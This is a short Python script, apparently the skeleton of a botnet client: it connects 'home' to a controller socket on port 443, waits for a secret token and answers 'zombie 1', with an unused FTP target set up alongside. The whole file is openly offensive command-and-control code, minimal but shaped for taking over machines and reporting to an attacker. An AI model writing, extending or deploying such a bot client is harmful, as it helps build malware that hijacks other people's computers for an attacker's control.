import os
from ftplib import *
import sys
import socket
import time

host = "127.0.0.1"	# Connect home
port = 443

target   = "127.0.0.1"
ftp_port = 21


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))


while True:
    time.sleep(1)
    srv_cmd = s.recv(1024)
    if srv_cmd == "9j3b3k8":
        srv_cmd = ""
        s.send("zombie 1")


        break
